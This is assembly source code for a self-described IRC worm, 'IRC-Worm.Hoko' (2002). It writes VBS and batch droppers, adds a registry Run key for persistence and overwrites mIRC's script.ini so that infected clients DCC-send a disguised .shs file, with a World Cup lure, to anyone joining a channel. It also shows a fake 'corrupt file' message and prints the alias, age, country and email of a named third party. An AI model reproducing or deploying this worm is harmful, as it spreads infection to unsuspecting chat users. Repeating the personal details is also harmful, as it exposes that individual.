   ; Virus Name: IRC-Worm.Hoko
   ; Version: A
   ; Type:  IRC-Worm
   ; Author: Kuasanagui
   ; E-mail: kuasanagui@rockeros.com
   ; IRC
   ; Server: Tabasco.Chatmirc.com
   ; Port: 6667
   ; Canal: Zonavirus

   .386
   .model flat, STDCALL
   LOCALS
   JUMPS


   extrn MessageBoxA:Proc
   extrn _lcreat:proc
   extrn _lwrite:proc
   extrn _lclose:proc
   extrn ExitProcess:proc
   extrn GetModuleHandleA:proc
   extrn CopyFileA:proc
   extrn GetModuleFileNameA:proc
   extrn GetSystemDirectoryA:proc
   extrn GetWindowsDirectoryA:proc
   extrn lstrcat:proc
   extrn ShellExecuteA:proc
   extrn RegSetValueA:proc

   size1 equ 1576d
   size2 equ 1072d
   size3 equ 73d

   .data

   worldcupvb db '\hokillo.vbs',0
   worldcupbat db 'C:\hoko.bat',0
   worldcupvbs db 'C:\hoko.vbs',0
   hoko_aviso db 'Software\Microsoft\Windows\CurrentVersion\Run\',0

   vbsito:
   ;(C) Yello Rutina
   db 'on error resume next',0dh,0ah
   db 'For i = 1 To 3',0dh,0ah
   db 'If i = 1 Then Drive = "c"',0dh,0ah
   db 'If i = 2 Then Drive = "D"',0dh,0ah
   db 'If i = 3 Then Drive = "E"',0dh,0ah
   db '    Set fso = CreateObject("Scripting.FileSystemObject")',0dh,0ah
   db '    Set f = fso.GetFolder(Drive & ":\")',0dh,0ah
   db '    Set sf = f.SubFolders',0dh,0ah
   db '    For Each f1 In sf',0dh,0ah
   db '',0dh,0ah
   db '                        If fso.fileExists(f1 & "\MIRC.INI") Then mIRCDir = f1 & "\MIRC.INI"',0dh,0ah
   db '                        Set G = fso.GetFolder(f1)',0dh,0ah
   db '                        Set Y = G.SubFolders',0dh,0ah
   db '                        For Each D1 In Y',0dh,0ah
   db '',0dh,0ah
   db '                                If fso.fileExists(D1 & "\MIRC.INI") Then mIRCDir = D1 & "\MIRC.INI"',0dh,0ah
   db '                                Set P = fso.GetFolder(D1)',0dh,0ah
   db '                                Set W = P.SubFolders',0dh,0ah
   db '                                For Each E1 In W',0dh,0ah
   db '',0dh,0ah
   db '    If fso.fileExists(E1 & "\MIRC.INI") Then mIRCDir = E1 & "\MIRC.INI"',0dh,0ah
   db '    Set Q = fso.GetFolder(E1)',0dh,0ah
   db '    Set J = Q.SubFolders',0dh,0ah
   db '    For Each T1 In J',0dh,0ah
   db '',0dh,0ah
   db '    Next: Next: Next: Next: Next',0dh,0ah
   db '',0dh,0ah
   db '        if mIRCDir <> "" then',0dh,0ah
   db '',0dh,0ah
   db '        mIRCDir = Mid(mIRCDir, 1, InStrRev(mIRCDir, "\"))',0dh,0ah
   db '        mIRCDir = Replace(mIRCDir,"""","")',0dh,0ah
   db '',0dh,0ah
   db '    Set fso = CreateObject("Scripting.FileSystemObject")',0dh,0ah
   db '    Set f = fso.OpenTextFile(mIRCDir & "Script.ini", 2, True)',0dh,0ah
   db '    f.WriteLine "[script]"',0dh,0ah
   db '    f.Write "n0=on 1:JOIN:#:if ( $me != $nick ) { /msg $Nick Hola, soy Hoko, mira como quedaron los resultados de los partidos del mundial de hoy! | /dcc send $NICK C:\worldcup.txt.shs }"',0dh,0ah
   db '    f.Close',0dh,0ah
   db '    end if',0dh,0ah
   ;(C) Fin de Yello Rutina
   db '',0dh,0ah
   db 'Set Hokowshhoko = CreateObject("WScript.Shell")',0dh,0ah
   db 'Set Hokofsohoko= CreateObject("scripting.filesystemobject")',0dh,0ah
   db 'Hokowshhoko.run ("C:\hoko.bat")',0dh,0ah
   bat:
   db 'ECHO    ----------------------------------------------------------->>C:\HOKO.TXT',0dh,0ah
   db 'ECHO IRC-Worm.Hoko by Kuasanagui / 13 Junio de 2002>>C:\HOKO.TXT',0dh,0ah
   db 'ECHO ESTE PEQUEÑO VIRUS >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO ESTA DEDICADO A HOKO >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO    ----------------------------------------------------------->>C:\HOKO.TXT',0dh,0ah
   db 'ECHO Alias: Hoko >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO Edad: 15 >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO Pais: España >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO E mail:cid800@hotmail.com >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO Aprendiz de hacker,  >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO le gusta mucho colecionar virus.  >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO Gracias a el mis virus son >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO detectados por Panda Antivirus >>C:\HOKO.TXT',0dh,0ah
   db 'ECHO    ----------------------------------------------------------->>C:\HOKO.TXT',0dh,0ah
   db 'COPY worldcup.txt.shs c:\worldcup.txt.shs>>C:\HOKO.TXT',0dh,0ah
   db 'DEL C:\Hokillo.vbs>>C:\HOKO.TXT',0dh,0ah
   db 'CLS',0dh,0ah
   db '@ECHO   -----------------------------------------------------------',0dh,0ah
   db '@ECHO         ARCHIVO CORRUPTO NO ES POSIBLE ABRIRLO',0dh,0ah
   db '@ECHO         (A) ACEPTAR  (N) ANULAR  (D) DESCARTAR',0dh,0ah
   db '@ECHO   -----------------------------------------------------------',0dh,0ah
   db 'PAUSE>>C:\HOKO.TXT',0dh,0ah
   vbs:
   db 'MsgBox "    ¿YA VISTE EL FUTBOL HOY?   ", 4096 , "World Cup Korean Japan"',0dh,0ah

   filename db 50 dup(0)

   .code

   Inicio:

       push eax
       push offset worldcupvbs
       push 1
       push offset hoko_aviso
       push 080000002h
       call RegSetValueA

       push 0
       call GetModuleHandleA

       push 50
       push offset filename
       push eax
       call GetModuleFileNameA


           push 0
       push offset worldcupvb
       call _lcreat

       push size1
       push offset vbsito
       push eax
       call _lwrite

       push 0
       push offset worldcupbat
       call _lcreat

       push size2
       push offset bat
       push eax
       call _lwrite

       push 0
       push offset worldcupvbs
       call _lcreat

       push size3
       push offset vbs
       push eax
       call _lwrite

       push 0
       push 0
       push 0
       push offset worldcupvb
       push 0
       push 0
       call ShellExecuteA


   end Inicio
